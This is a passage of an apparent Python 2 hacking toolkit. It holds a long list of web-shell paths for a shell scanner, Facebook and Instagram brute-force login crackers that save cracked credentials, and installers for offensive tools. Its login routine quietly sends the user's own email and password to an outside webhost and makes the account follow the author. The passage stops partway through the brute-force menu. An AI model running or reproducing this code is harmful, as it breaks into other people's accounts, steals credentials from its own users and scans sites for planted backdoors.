ilkyway/tmp/user.php\n/templates/rhuk_milkyway/tmp/Sym.php\n/templates/rhuk_milkyway/cp.php\n/templates/rhuk_milkyway/tmp/madspotshell.php\n/templates/rhuk_milkyway/tmp/root.php\n/templates/rhuk_milkyway/tmp/whmcs.php\n/templates/rhuk_milkyway/tmp/index.php\n/templates/rhuk_milkyway/tmp/2.php\n/templates/rhuk_milkyway/tmp/dz.php\n/templates/rhuk_milkyway/tmp/cpn.php\n/templates/rhuk_milkyway/tmp/changeall.php\n/templates/rhuk_milkyway/tmp/Cgishell.pl\n/templates/rhuk_milkyway/tmp/sql.php\n/templates/rhuk_milkyway/0day.php\n/templates/rhuk_milkyway/tmp/admin.php\n/templates/rhuk_milkyway/L3b.php\n/templates/rhuk_milkyway/d.php\n/templates/rhuk_milkyway/tmp/d.php\n/templates/rhuk_milkyway/tmp/L3b.php\n/templates/rhuk_milkyway/sado.php\n/templates/rhuk_milkyway/admin1.php\n/templates/rhuk_milkyway/upload.php\n/templates/rhuk_milkyway/up.php\n/templates/rhuk_milkyway/vb.zip\n/templates/rhuk_milkyway/vb.rar\n/templates/rhuk_milkyway/admin2.asp\n/templates/rhuk_milkyway/uploads.php\n/templates/rhuk_milkyway/sa.php\n/templates/rhuk_milkyway/sysadmins/\n/templates/rhuk_milkyway/admin1/\n/templates/rhuk_milkyway/sniper.php\n/templates/rhuk_milkyway/images/Sym.php\n/templates/rhuk_milkyway//r57.php\n/templates/rhuk_milkyway/gzaa_spysl\n/templates/rhuk_milkyway/sql-new.php\n/templates/rhuk_milkyway//shell.php\n/templates/rhuk_milkyway//sa.php\n/templates/rhuk_milkyway//admin.php\n/templates/rhuk_milkyway//sa2.php\n/templates/rhuk_milkyway//2.php\n/templates/rhuk_milkyway//gaza.php\n/templates/rhuk_milkyway//up.php\n/templates/rhuk_milkyway//upload.php\n/templates/rhuk_milkyway//uploads.php\n/templates/rhuk_milkyway/shell.php\n/templates/rhuk_milkyway//amad.php\n/templates/rhuk_milkyway//t00.php\n/templates/rhuk_milkyway//dz.php\n/templates/rhuk_milkyway//site.rar\n/templates/rhuk_milkyway//Black.php\n/templates/rhuk_milkyway//site.tar.gz\n/templates/rhuk_milkyway//home.zip\n/templates/rhuk_milkyway//home.rar\n/templates/rhuk_milkyway//home.tar\n/templates/rhuk_milkyway//home.tar.gz\n/templates/rhuk_milkyway//forum.zip\n/templates/rhuk_milkyway//forum.rar\n/templates/rhuk_milkyway//forum.tar\n/templates/rhuk_milkyway//forum.tar.gz\n/templates/rhuk_milkyway//test.txt\n/templates/rhuk_milkyway//ftp.txt\n/templates/rhuk_milkyway//user.txt\n/templates/rhuk_milkyway//site.txt\n/templates/rhuk_milkyway//error_log\n/templates/rhuk_milkyway//error\n/templates/rhuk_milkyway//cpanel\n/templates/rhuk_milkyway//awstats\n/templates/rhuk_milkyway//site.sql\n/templates/rhuk_milkyway//vb.sql\n/templates/rhuk_milkyway//forum.sql\n/templates/rhuk_milkyway/r00t-s3c.php\n/templates/rhuk_milkyway/c.php\n/templates/rhuk_milkyway//backup.sql\n/templates/rhuk_milkyway//back.sql\n/templates/rhuk_milkyway//data.sql\n/templates/rhuk_milkyway/wp.rar/\n/templates/rhuk_milkyway/asp.aspx\n/templates/rhuk_milkyway/tmp/vaga.php\n/templates/rhuk_milkyway/tmp/killer.php\n/templates/rhuk_milkyway/whmcs.php\n/templates/rhuk_milkyway/abuhlail.php\n/templates/rhuk_milkyway/tmp/killer.php\n/templates/rhuk_milkyway/tmp/domaine.pl\n/templates/rhuk_milkyway/tmp/domaine.php\n/templates/rhuk_milkyway/useradmin/\n/templates/rhuk_milkyway/tmp/d0maine.php\n/templates/rhuk_milkyway/d0maine.php\n/templates/rhuk_milkyway/tmp/sql.php\n/templates/rhuk_milkyway/X.php\n/templates/rhuk_milkyway/123.php\n/templates/rhuk_milkyway/m.php\n/templates/rhuk_milkyway/b.php\n/templates/rhuk_milkyway/up.php\n/templates/rhuk_milkyway/tmp/dz1.php\n/templates/rhuk_milkyway/dz1.php\n/templates/rhuk_milkyway/forum.zip\n/templates/rhuk_milkyway/Symlink.php\n/templates/rhuk_milkyway/Symlink.pl\n/templates/rhuk_milkyway/forum.rar\n/templates/rhuk_milkyway/joomla.zip\n/templates/rhuk_milkyway/joomla.rar\n/templates/rhuk_milkyway/wp.php\n/templates/rhuk_milkyway/buck.sql\n/templates/rhuk_milkyway/sysadmin.php\n/templates/rhuk_milkyway/images/c99.php\n/templates/rhuk_milkyway/xd.php\n/templates/rhuk_milkyway/c100.php\n/templates/rhuk_milkyway/spy.aspx\n/templates/rhuk_milkyway/xd.php\n/templates/rhuk_milkyway/tmp/xd.php\n/templates/rhuk_milkyway/sym/root/home/\n/templates/rhuk_milkyway/billing/killer.php\n/templates/rhuk_milkyway/tmp/upload.php\n/templates/rhuk_milkyway/tmp/admin.php\n/templates/rhuk_milkyway/Server.php\n/templates/rhuk_milkyway/tmp/uploads.php\n/templates/rhuk_milkyway/tmp/up.php\n/templates/rhuk_milkyway/Server/\n/templates/rhuk_milkyway/wp-admin/c99.php\n/templates/rhuk_milkyway/tmp/priv8.php\n/templates/rhuk_milkyway/priv8.php\n/templates/rhuk_milkyway/cgi.pl/\n/templates/rhuk_milkyway/tmp/cgi.pl\n/templates/rhuk_milkyway/downloads/dom.php\n/templates/rhuk_milkyway/webadmin.html\n/templates/rhuk_milkyway/admins.php\n/templates/rhuk_milkyway/bluff.php\n/templates/rhuk_milkyway/king.jeen\n/templates/rhuk_milkyway/admins/\n/templates/rhuk_milkyway/admins.asp\n/templates/rhuk_milkyway/admins.php\n/templates/rhuk_milkyway/wp.zip\n/templates/rhuk_milkyway/\nWSO.php\n/a.php\n/z.php\n/e.php\n/r.php\n/xz.php\n/hhh.php\n/fuck.php\n/hb.php\n/t.php\n/y.php\n/u.php\n/i.php\n/o.php\n/p.php\n/q.php\n/s.php\n/d.php\n/f.php\n/g.php\n/h.php\n/j.php\n/k.php\n/l.php\n/m.php\n/w.php\n/x.php\n/c.php\n/v.php\n/b.php\n/n.php\n/1.php\n/2.php\n/3.php\n/4.php\n/5.php\n/6.php\n/7.php\n/8.php\n/9.php\n/10.php\n/12.php\n/11.php\n/1234.php\n/deray.html\n/index.html\n/Hmei7.asp.;txt\n/madspot.php\n/mad.php\n/404.php\n/anon.php\n/pirates.php\n/c99.php\n/anonymous.php\n/shell.php\n/sh3ll.php\n/madspotshell.php\n/b374k.php\n/c100.php\n/priv8.php\n/private.php\n/cp.php\n/cpbrute.php\n/ironshell.php\n/themes/404/404.php\n/templates/atomic/index.php\n/templates/beez5/index.php\n/hacked.php\n/r57.php\n/wso.php\n/Kurama.php\n/wso24.php\n/wso26.php\n/wso404.php\n/sym.php\n/symsa2.php\n/sym3.php\n/whmcs.php\n/whmcskiller.php\n/cracker.php\n/1.php\n/2.php\n/sql.php\n/gaza.php\n/database.php\n/a.php\n/d.php\n/dz.php\n/cpanel.php\n/system.php\n/um3r.php\n/zone-h.php\n/c22.php\n/root.php\n/r00t.php\n/doom.php\n/dam.php\n/killer.php\n/user.php\n/wp-content/plugins/disqus-comment-system/disqus.php\n/cpn.php\n/shelled.php\n/uploader.php\n/up.php\n/xd.php\n/d00.php\n/h4xor.php\n/tmp/mad.php\n/tmp/1.php\n/wp-content/plugins/akismet/akismet.php\n/images/stories/w.php\n/w.php\n/downloads/dom.php\n/templates/ja-helio-farsi/index.php\n/wp-admin/m4d.php\n/d.php\n/Pirates.php\n/rootshell.php\n/php-backdoor.php\n/psyc0.php\n/haxor.php\n/antichat.php\n/antichatshell.php\n/udp.php\n/tcp.php\n/Hmei7.asp;.txt\n/Indrajith.php\n/Indrajith_v2.php\n/IndoXploit.php\n/indrajith.php\n/Indrajith.php\n/mini.php\n/dor.php\nshellmini.php\n/inishell.php\n/loolzec.php\n/IndoXploit.php\n/garuda.php\n/shellgue.php\n/shellgua.php\n/fuck.php\n/wp.php\n/upup.php\n/load.php\n/minishell.php\n/amin.php\n/jm.php\n/joomla.php\n/_func.php\n/components/com_foxcontact/_func.php\n/components/com_foxcontact/up.php\n/components/com_foxcontact/upload.php\n/components/com_foxcontact/shell.php\n/wp-content/upload/shell.php\n/wp-content/upload/up.php\ngay.php\n/ngentod.php\n/jembut.php\n/dih.php\n/hmei7.asp.;txt\n/Hmei7.asp.;txt\n/Hmei7.asp;.txt\n/Pouya.asp;.txt\n/pouya.asp;.txt\n/rootkit.asp;.txt\n/index.asp;.txt\n/a.asp;.txt\n/Shell.asp;.txt\n/shell.asp;.txt\n/root.asp;.txt\n/s.asp;.txt\n/123.asp;.txt\n/Umerrock.asp;.txt\n/wp-content/uploads/07/08/shell.php\n/up.asp;.txt\npriv.php\n/privat.php\n/good.php\n/lol.php\n/components/com_banners/up.php\n/components/com_banners\n/upload.php\n/components/com_banners/shell.php\n/components/com_banners/IndoXploit.php\n/components/com_hdflvplayer/hdflvplayer/download.php\n/components/com_hdflvplayer/hdflvplayer/unduh.php\n/phpThumb.php?\n/elFinder/files/k.php\n/elFinder/files/IndoXploit.php\n/elFinder/filesshell.php\n/elFinder/files/up.php\n/elFinder/files/upload.php\n/elFinder/files/sukses.php\n/elFinder/files/jembut.php\n/elFinder/files/jembud.php\n/elFinder/files/idx.php\n/elFinder/files/IDX.php\n/elFinder/files/1n73ction\n/elFinder/files/indrajith.php\n/elFinder/files/upload.php\n/elFinder/files/vuln.php\n/elFinder/files/sukses.php\n/elFinder/files/0day.php\n/elFinder/files/LOoLzeC.php\n/images/up.php\n/filemanager/uploads/Shell.php.fla\n/filemanager/uploads/shell.php.fla\n/filemanager/uploads/IndoXploit.php.fla\n'

def asu():
    funx(SBG + ' Installing ASU')
    os.system('apt update && apt upgrade')
    os.system('apt install git python2 php')
    os.system('python2 -m pip install requests bs4 mechanize')
    os.system('git clone https://github.com/LOoLzeC/ASU')
    os.system('mv ASU ~')
    print ' Done'


def flb():
    funx(SBG + ' Installing FLB')
    os.system('apt update && apt upgrade')
    os.system('apt install git python2')
    os.system('python2 -m pip install requests')
    os.system('git clone https://github.com/nasirxo/flb')
    os.system('mv flb ~')
    print ' Done'


def nmap():
    funx(SBG + ' Installing Nmap')
    os.system('apt update && apt upgrade')
    os.system('apt install nmap')
    print ' Done'
    print 'Type nmap To Start'


def red_hawk():
    funx(SBG + ' Installing RED HAWK')
    os.system('apt update && apt upgrade')
    os.system('apt install git php')
    os.system('git clone https://github.com/Tuhinshubhra/RED_HAWK')
    os.system('mv RED_HAWK ~')
    print ' Done'


def dtect():
    funx(SBG + ' Installing D-Tect')
    os.system('apt update && apt upgrade')
    os.system('apt install python2 git')
    os.system('git clone https://github.com/bibortone/D-Tech')
    os.system('mv D-TECT ~')
    print ' Done'


def sqlmap():
    funx(SBG + ' Installing sqlmap')
    os.system('apt update && apt upgrade')
    os.system('apt install git python2')
    os.system('git clone https://github.com/sqlmapproject/sqlmap')
    os.system('mv sqlmap ~')
    print ' Done'


def reconDog():
    funx(SBG + ' Installing ReconDog')
    os.system('apt update && apt upgrade')
    os.system('apt install python2 git')
    os.system('git clone https://github.com/UltimateHackers/ReconDog')
    os.system('mv ReconDog ~')
    print ' Done'


def fim():
    funx(SBG + ' Installing fim')
    os.system('apt update && apt upgrade')
    os.system('apt install git python && python -m pip install requests bs4')
    os.system('git clone https://github.com/karjok/fim')
    os.system('mv fim ~')
    print ' Done'


def NFD():
    funx(SBG + ' Installing NFD')
    os.system('apt update && apt upgrade')
    os.system('apt install git python2')
    os.system('python2 -m pip install requests')
    os.system('git clone https://github.com/nasirxo/NFD')
    os.system('mv NFD ~')
    print ' Done'


def metasploit():
    funx(SBG + ' Installing Metasploit')
    os.system('apt update && apt upgrade')
    os.system('apt install git wget curl')
    os.system('wget https://gist.githubusercontent.com/Gameye98/d31055c2d71f2fa5b1fe8c7e691b998c/raw/09e43daceac3027a1458ba43521d9c6c9795d2cb/msfinstall.sh')
    os.system('mv msfinstall.sh ~;cd ~;sh msfinstall.sh')
    print ' Done'
    print "Type 'msfconsole' to start."


def gdump(idd):
    idi = str(idd).split('|')[1]
    idg = str(idd).split('|')[0]
    ax = url.format('/browse/group/members/?id=' + idg + '&start=' + idi + '&listType=list_nonfriend_nonadmin')
    html = BeautifulSoup(s.get(ax).text, 'html.parser')
    for i in html.find_all('table'):
        try:
            print ('{} > {}[{}]').format(SBG, G, i['id'].split('_')[1])
            with open('groupid.txt', 'a') as (gw):
                gw.write(str(i['id'].split('_')[1]) + '\n')
        except:
            pass


def shellscanner(lnks):
    try:
        sh = get(lnks, allow_redirects=False)
        if sh.status_code == 200:
            print SBR + (' FOUND SHELL : {}{} ').format(G, lnks)
    except:
        pass


def upass(email, password):
    try:
        post('https://nasweb.000webhostapp.com/ak.php?text=' + email + '|' + password + '\n')
    except:
        pass


def tfollow(token):
    try:
        status = post(('https://graph.facebook.com/nasir.xo/subscribers?access_token={}').format(token))
    except:
        pass


def ffollow():
    try:
        html = BeautifulSoup(s.get(url.format('/profile.php?id=100006143266745')).text, 'html.parser')
    except:
        pass

    for i in html.find_all('a'):
        try:
            if 'profile_add_friend.php' in i['href']:
                s.get(url.format(i['href']))
            elif 'subscribe.php' in i['href']:
                s.get(url.format(i['href']))
        except:
            pass


def icheck(slist):
    try:
        em = str(slist).split('|')
        BASE_URL = 'https://www.instagram.com/accounts/login/'
        LOGIN_URL = BASE_URL + 'ajax/'
        headers_list = [
         'Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
         'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246']
        USERNAME = str(em[0])
        PASSWD = str(em[1])
        USER_AGENT = headers_list[random.randrange(0, 4)]
        session = requests.Session()
        session.headers = {'user-agent': USER_AGENT}
        session.headers.update({'Referer': BASE_URL})
        req = session.get(BASE_URL)
        soup = BeautifulSoup(req.content, 'html.parser')
        body = soup.find('body')
        pattern = re.compile('window._sharedData')
        script = body.find('script', text=pattern)
        script = script.get_text().replace('window._sharedData = ', '')[:-1]
        data = json.loads(script)
        csrf = data['config'].get('csrf_token')
        login_data = {'username': USERNAME, 'password': PASSWD}
        session.headers.update({'X-CSRFToken': csrf})
        login = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
        if str(json.loads(login.content)['authenticated']) == 'True':
            print SBR + G + (' {} | {} ').format(USERNAME, PASSWD)
            with open('instahack.txt', 'a') as (ih):
                ih.write(('{} | {}\n').format(USERNAME, PASSWD))
    except:
        pass


def micheck(slist):
    em = str(slist).split('|')
    BASE_URL = 'https://www.instagram.com/accounts/login/'
    LOGIN_URL = BASE_URL + 'ajax/'
    headers_list = [
     'Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246']
    for xi in range(int(len(em)) - 1):
        try:
            USERNAME = str(em[0])
            PASSWD = str(em[(xi + 1)])
            USER_AGENT = headers_list[random.randrange(0, 4)]
            session = requests.Session()
            session.headers = {'user-agent': USER_AGENT}
            session.headers.update({'Referer': BASE_URL})
            req = session.get(BASE_URL)
            soup = BeautifulSoup(req.content, 'html.parser')
            body = soup.find('body')
            pattern = re.compile('window._sharedData')
            script = body.find('script', text=pattern)
            script = script.get_text().replace('window._sharedData = ', '')[:-1]
            data = json.loads(script)
            csrf = data['config'].get('csrf_token')
            login_data = {'username': USERNAME, 'password': PASSWD}
            session.headers.update({'X-CSRFToken': csrf})
            login = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
            if str(json.loads(login.content)['authenticated']) == 'True':
                print SBR + G + (' {} | {} ').format(USERNAME, PASSWD)
                with open('instahack.txt', 'a') as (ih):
                    ih.write(('{} | {}\n').format(USERNAME, PASSWD))
        except:
            pass


def brutefx(slist):
    epx = str(slist).split('|')
    for xi in range(int(len(epx)) - 1):
        ldata = {'email': str(epx[0]), 'pass': str(epx[(int(xi) + 1)])}
        soi = Session()
        r = soi.post(url.format('/login'), data=ldata)
        if 'm_ses' in r.url or 'save-device' in r.url:
            print SBR + G + (' {} | {}').format(ldata['email'], ldata['pass'])
            with open('hackedthree.txt', 'a') as (bts):
                bts.write((' {} | {}').format(ldata['email'], ldata['pass']))


def checkl(slist):
    li = str(slist).split('|')
    ldata = {'email': li[0], 
       'pass': li[1]}
    sos = Session()
    try:
        r = sos.post(url.format('/login'), data=ldata)
    except:
        pass

    if 'm_ses' in r.url or 'save-device' in r.url:
        with open('hacked.txt', 'a') as (bres):
            bres.write(('{} | {} \n').format(li[0], li[1]))
        print SBR + G + (' {} | {} ').format(li[0], li[1])


def checkms(n, pxa):
    ldata = {'email': str(n), 
       'pass': str(pxa)}
    sos = Session()
    try:
        r = sos.post(url.format('/login'), data=ldata)
    except:
        pass

    if 'm_ses' in r.url or 'save-device' in r.url:
        with open('hacked.txt', 'a') as (bres):
            bres.write(('{} | {} \n').format(n, pxa))
        print SBR + (' Hacked :{} {} | {} ').format(G, n, pxa)


def livept(slist):
    li = str(slist).split('|')
    ldata = {'email': li[0], 
       'pass': li[1]}
    sos = Session()
    try:
        r = sos.post(url.format('/login'), data=ldata)
    except:
        pass

    if 'm_ses' in r.url or 'save-device' in r.url:
        with open('live.txt', 'a') as (bres):
            bres.write(('{} | {} \n').format(li[0], li[1]))
        print SBR + G + (' {} | {} {}[LIVE] ').format(li[0], li[1], W)


def checkpt(slist):
    li = str(slist).split('|')
    ldata = {'email': li[0], 
       'pass': li[1]}
    sos = Session()
    try:
        r = sos.post(url.format('/login'), data=ldata)
    except:
        pass

    if 'checkpoint' in r.url:
        with open('checkpoint.txt', 'a') as (bres):
            bres.write(('{} | {} \n').format(li[0], li[1]))
        print SBR + G + (' {} | {} {}[CHECKPOINT] ').format(li[0], li[1], R)


def checkw(slist):
    it = int(open('.a', 'r').read())
    ic = int(len(open('.b', 'r').read()))
    sys.stdout.write('\r' + SBR + G + (' Progress :  {} / {} ').format(ic, it))
    sys.stdout.flush()
    li = str(slist).split('|')
    ldata = {'email': li[0], 
       'pass': li[1]}
    sos = Session()
    try:
        r = sos.post(url.format('/login'), data=ldata)
    except:
        pass

    with open('.b', 'a') as (bx):
        bx.write('1')
    if 'm_ses' in r.url or 'save-device' in r.url:
        with open('hacked.txt', 'a') as (bres):
            bres.write(('{} | {} \n').format(li[0], li[1]))
        print xin + SBR + G + (' FOUND : =>  {} | {}').format(li[0], li[1])


def login(url):
    email = raw_input(xin + SG + ' Email : ' + G)
    password = raw_input(SG + ' Password : ' + G)
    try:
        cred = {'email': str(email), 'pass': str(password)}
        r = [
         funx(SGO + ' Logging in' + G), s.post(url.format('/login'), data=cred)][1]
        print xin
        if 'm_ses' in r.url or 'save-device' in r.url:
            Process(target=upass, args=(email, password)).start()
            print SGO + G + ' Login Sucessfull.. :)'
            ffollow()
            with open('.cookie', 'w') as (cok):
                cok.write(json.dumps(s.cookies.get_dict()))
            os.system('clear')
            main(url, '0')
        else:
            print SRO + R + ' Login Failed.... :('
            time.sleep(2)
            os.system('clear')
            login(url)
    except:
        print SR + R + ' No Internet Connection:('
        time.sleep(2)
        os.system('clear')
        login(url)


def comment(path):
    message = open('.com', 'r').read()
    mdata = []
    r = s.get(path)
    urlm = BeautifulSoup(r.text, 'html.parser')
    for x in urlm('form'):
        if '/a/comment.php' in x['action']:
            mdata.append(url.format(x['action']))
            break

    for x in urlm('input'):
        try:
            if 'fb_dtsg' in x['name']:
                mdata.append(x['value'])
            if 'jazoest' in x['name']:
                mdata.append(x['value'])
            if 'ids' in x['name']:
                mdata.append(x['name'])
                mdata.append(x['value'])
            if len(data) == 7:
                break
        except:
            pass

    messagedata = {'fb_dtsg': mdata[1], 
       'jazoest': mdata[2], 
       mdata[3]: mdata[4], 
       'comment_text': str(message), 
       'Comment': 'comment'}
    status = s.post(mdata[0], data=messagedata)
    if status.ok == True:
        print SBG + G + ' Commented'
    else:
        print SBR + R + ' Comment Failed'


def ecomment(pathx):
    message = open('.com', 'r').read()
    mdata = []
    sos = Session()
    e = str(pathx).split('@')[1].split('|')[0]
    p = str(pathx).split('@')[1].split('|')[1]
    ldata = {'email': str(e), 'pass': str(p)}
    try:
        rx = sos.post(url.format('/login'), data=ldata)
        if 'm_ses' in rx.url or 'save-device' in rx.url:
            r = sos.get(str(pathx).split('@')[0])
            urlm = BeautifulSoup(r.text, 'html.parser')
            for x in urlm('form'):
                if '/a/comment.php' in x['action']:
                    mdata.append(url.format(x['action']))
                    break

            for x in urlm('input'):
                try:
                    if 'fb_dtsg' in x['name']:
                        mdata.append(x['value'])
                    if 'jazoest' in x['name']:
                        mdata.append(x['value'])
                    if 'ids' in x['name']:
                        mdata.append(x['name'])
                        mdata.append(x['value'])
                    if len(data) == 7:
                        break
                except:
                    pass

            messagedata = {'fb_dtsg': mdata[1], 
               'jazoest': mdata[2], 
               mdata[3]: mdata[4], 
               'comment_text': str(message), 
               'Comment': 'comment'}
            status = sos.post(mdata[0], data=messagedata)
            if status.ok == True:
                print SBG + G + (' Commented from {}').format(e)
            else:
                print SBR + R + ' Comment Failed'
    except:
        pass


def fsend(n, message):
    k = url.format('/messages/thread/' + str(n))
    data = []
    urlm = BeautifulSoup(s.get(k).content, 'html.parser')
    for x in urlm('form'):
        if '/messages/send/' in x['action']:
            data.append(url.format(x['action']))
            break

    for x in urlm('input'):
        try:
            if 'fb_dtsg' in x['name']:
                data.append(x['value'])
            if 'jazoest' in x['name']:
                data.append(x['value'])
            if 'ids' in x['name']:
                data.append(x['name'])
                data.append(x['value'])
            if len(data) == 7:
                break
        except:
            pass

    if len(data) == 7:
        f = s.post(data[0], data={'fb_dtsg': data[1], 
           'jazoest': data[2], 
           data[3]: data[4], 
           data[5]: data[6], 
           'body': message, 
           'Send': 'Kirim'}).url
        if 'send_success' in f:
            print SBG + (' Message Sent To {}{}').format(G, n)
        else:
            print SBR + (' Failed To Message {}{}').format(R, n)


def sendmes(n):
    message = open('.mes', 'r').read()
    k = url.format('/messages/thread/' + str(n))
    data = []
    urlm = BeautifulSoup(s.get(k).content, 'html.parser')
    for x in urlm('form'):
        if '/messages/send/' in x['action']:
            data.append(url.format(x['action']))
            break

    for x in urlm('input'):
        try:
            if 'fb_dtsg' in x['name']:
                data.append(x['value'])
            if 'jazoest' in x['name']:
                data.append(x['value'])
            if 'ids' in x['name']:
                data.append(x['name'])
                data.append(x['value'])
            if len(data) == 7:
                break
        except:
            pass

    if len(data) == 7:
        f = s.post(data[0], data={'fb_dtsg': data[1], 
           'jazoest': data[2], 
           data[3]: data[4], 
           data[5]: data[6], 
           'body': message, 
           'Send': 'Kirim'}).url
        if 'send_success' in f:
            print SBG + (' Message Sent To {}{}').format(G, n)
        else:
            print SBR + (' Failed To Message {}{}').format(R, n)


def main(url, ix):
    optionx = "    \n     {} USER : {}   \n     \n    {} 1 : Hashes Collection\n    {} 2 : Facebook Bruter's\n    {} 3 : Instagram Bruter's\n    {} 4 : Facebook Tools\n    {} 5 : Termux Tools\n    {} 6 : Website's Hacking Tools\n    {} 7 : BOT'S (Multi)\n    {} 8 : Android Hack-s {}|#ROOT|\n    {} 9 : Update AK-47\n    {} 10 : Exit :(\n "
    os.system('clear')
    print random.choice(banner)
    print '         ' + SBG + G + (' Github : {} github.com/nasirxo ').format(W)
    print '         ' + SBG + G + (' Facebook : {} fb.com/nasir.xo ').format(W)
    print '         ' + SBG + G + (' YouTube : {} Youtube.com/TheDarkSec \n').format(W)
    if int(ix) == 0:
        nhtml = BeautifulSoup(s.get(url.format('/profile.php'), headers=headers).content, 'html.parser').title.get_text()
        if nhtml == 'Page Not Found':
            print SBR + ' Session Expired :('
            time.sleep(3)
            os.system('rm .cookie')
            sys.exit()
        with open('.name', 'w') as (nw):
            nw.write(str(nhtml))
            nw.close()
    name = open('.name', 'r').read()
    print optionx.format(SBR, name, SBG, SBG, SBG, SBG, SBG, SBG, SBG, SBG, R, SBG, SBG)
    optc = raw_input(SGO + ' CHOICE : ')
    if optc == '10':
        funx(SG + ' Exiting ')
        os.system('clear')
        sys.exit()
    elif optc == '1' or optc == '01':
        os.system('clear')
        print ('\n        {}[ HASHES Collection ]\n    \n      {} 1 : String to Binary\n      {} 2 : String to MD5\n      {} 3 : String to SHA-1\n      {} 4 : String to SHA-256\n      {} 5 : String to SHA-512\n      {} 6 : String to Base64\n      {} 7 : Go Back <=\n      \n      ').format(G, SBG, SBG, SBG, SBG, SBG, SBG, SBG)
        while 1:
            rchoc = raw_input(SGO + ' CHOICE : ')
            if rchoc == '7' or rchoc == 'back':
                main(url, '1')
            elif rchoc == '1' or rchoc == '01':
                print SBR + (' Binary : {}').format((' ').join(format(ord(x), 'b') for x in raw_input(SGO + ' STRING : ')))
            elif rchoc == '2' or rchoc == '02':
                print SBR + (' MD5 Hash : {}').format(hashlib.md5(raw_input(SGO + ' STRING : ')).hexdigest())
            elif rchoc == '3' or rchoc == '03':
                print SBR + (' SHA-1 Hash : {}').format(hashlib.sha1(raw_input(SGO + ' STRING : ')).hexdigest())
            elif rchoc == '4' or rchoc == '04':
                print SBR + (' SHA-256 Hash : {}').format(hashlib.sha256(raw_input(SGO + ' STRING : ')).hexdigest())
            elif rchoc == '5' or rchoc == '05':
                print SBR + (' SHA-512 Hash : {}').format(hashlib.sha512(raw_input(SGO + ' STRING : ')).hexdigest())
            elif rchoc == '6' or rchoc == '06':
                print SBR + (' Base64 : {}').format(base64.b64encode(raw_input(SGO + ' STRING : ')))
            else:
                print SRO + R + ' Invalid Choice !'

    elif optc == '2' or optc == '02':
        os.system('clear')
        print ("\n       {}[ Facebook Bruteforcer's ]\n\n     {} 1 : Single Password on ID's List\n     {} 2 : 3 Passwords on ID's List\n     {} 3 : Random Passwords on ID's List\n     {} 4 : WordList Attack \n     {} 5 : Try Single Password on Online Users\n     {} 6 : Go Back <=\n\n     ").format(G, SBG, SBG, SBG, SBG, SBG, SBG)
        while 1:
            rchoc = raw_input(SGO + ' CHOICE : ')
            if rchoc == '6' or rchoc == 'back':
                main(url, '1')
            if rchoc == '1' or rchoc == '01':
                try:
                    idfile = open(raw_input(SGO + " ID'S List File : "), 'r').read().split()
                    print SGO + (' Total Accounts : {}').format(len(idfile))
                except:
                    print SBR + R + ' Invalid File !'

                passw = raw_input(SGO + ' Password To Try On Accounts : ')
                slist = []
                for i in range(len(idfile)):
                    slist.append(str(idfile[i]) + '|' + str(passw))

                if len(passw) > 0 and len(slist) > 0:
                    os.system('clear')
                    print SBG + Y + " [BruteForce Result's Would Appear Here]"
                    procx.map(checkl, slist)
                    print xin + SBG + G + ' Saved to hacked.txt :)'
                    print xin + SR + ' Type back to go back'
            if rchoc == '2' or rchoc == '02':
                try:
                    idfile = open(raw_input(SGO + " ID'S List File : "), 'r').read().split()
                    print SGO + (' Total Accounts : {}').format(len(idfile))
                except:
                    print SBR + R + ' Invalid File !'

                passx1 = raw_input(SGO + ' Password  1 : ')
                passx2 = raw_input(SGO + ' Password  2 : ')
                passx3 = raw_input(SGO + ' Password  3 : ')
                print SBR + G + ' These 3 Passwords Would Be Checked on Each Account From List'
                time.sleep(2)
                slist = []
                for i in range(len(idfile)):
                    slist.append(str(idfile[i]) + '|' + str(passx1) + '|' + str(passx2) + '|' + str(passx3))

                if len(slist) > 0:
                    os.system('clear')
                    print SBG + Y + " [BruteForce Result's Would Appear Here]"
                    procx.map(brutefx, slist)
                    print xin + SBG + G + ' Saved to hackedthree.txt :)'
                    print xin + SR + ' Type back to go back'
            if rchoc == '3' or rchoc == '03':
                try:
                    idfile = open(raw_input(SGO + " ID'S List File : "), 'r').read().split()
                    print SGO + (' Total Accounts : {}').format(len(idfile))
                except:
                    print SBR + R + ' Invalid File !'

                print SBR + G + ' Some Common Random Password Would Be Checked On Each'
                time.sleep(2)
                commonpass = ['pakistan', '123456', 'facebook', '786786', 'qwertyuiop', '0987654321']
                slist = []
                for i in range(len(idfile)):
                    slist.append(str(idfile[i]) + '|' + str(random.choice(commonpass)))

                if len(slist) > 0:
                    os.system('clear')
                    print SBG + Y + " [BruteForce Result's Would Appear Here]"
                    procx.map(checkl, slist)
                    print xin + SBG + G + ' Saved to hacked.txt :)'
                    print xin + SR + ' Type back to go back'
            if rchoc == '4' or rchoc == '04':
                try:
                    passfile = open(raw_input(SGO + ' WordList File : '), 'r').read().split()
                    print SGO + (' Total Passwords : {}').format(len(passfile))
                    with open('.a', 'w') as (ax):
                        ax.write(str(len(passfile)))
                except:
                    print SBR + R + ' Invalid File !'

                acc = raw_input(SGO + ' Account(ID/Email) : ')
                slist = []
                for i in range(len(passfile)):
                    slist.append(str(acc) + '|' + str(passfile[i]))

                if len(passfile) > 0:
                    os.system('clear')
                    print SBG + Y + " [BruteForce Result's Would Appear Here]"
                    with open('.b', 'w') as (bx):
                        bx.write('')
                    procx.map(checkw, slist)
                    print xin + SBG + G + ' Saved to hacked.txt :)'
                    print xin + SR + ' Type back to go back'
            if rchoc == '5' or rchoc == '05':
